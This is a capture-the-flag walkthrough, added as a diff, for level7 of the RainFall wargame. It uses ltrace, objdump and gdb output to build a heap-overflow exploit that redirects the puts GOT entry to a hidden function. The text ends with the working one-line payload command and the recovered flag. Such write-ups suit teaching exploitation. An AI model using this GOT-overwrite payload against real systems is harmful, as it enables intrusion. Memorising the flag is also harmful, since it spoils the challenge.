@@ -1,0 +1,47 @@
+level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY
+__libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                            = 0x0804a008
+malloc(8)                                                            = 0x0804a018
+malloc(8)                                                            = 0x0804a028
+malloc(8)                                                            = 0x0804a038
+strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"...)            = 0x0804a018
+strcpy(0x46464646, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+# so the offset to b[1] is 20 (5 * 4)
+
+# since function 'm' prints the global variable 'c' which will contain the flag after 'fgets' call in main function.
+# we need to execute it somehow (it's not called in the program).
+# but, by overriding b[1] (dest pointer of the second strcpy), the second strcpy will help us overwrite
+# the address of 'puts' in its GOT entry to point to function 'm' instead.
+# In order to achieve this, we need both the address of puts GOT entry and the address to 'm' function
+
+level7@RainFall:~$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+
+# the address of 'puts' GOT entry: 0x08049928
+
+(gdb) disas m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:	push   %ebp
+   0x080484f5 <+1>:	mov    %esp,%ebp
+   0x080484f7 <+3>:	sub    $0x18,%esp
+   0x080484fa <+6>:	movl   $0x0,(%esp)
+   0x08048501 <+13>:	call   0x80483d0 <time@plt>
+   0x08048506 <+18>:	mov    $0x80486e0,%edx
+   0x0804850b <+23>:	mov    %eax,0x8(%esp)
+   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:	mov    %edx,(%esp)
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:	leave  
+   0x08048520 <+44>:	ret    
+End of assembler dump.
+
+# 0x080484f4 is the address of the first instruction of 'm'
+
+# Solution:
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1782694057
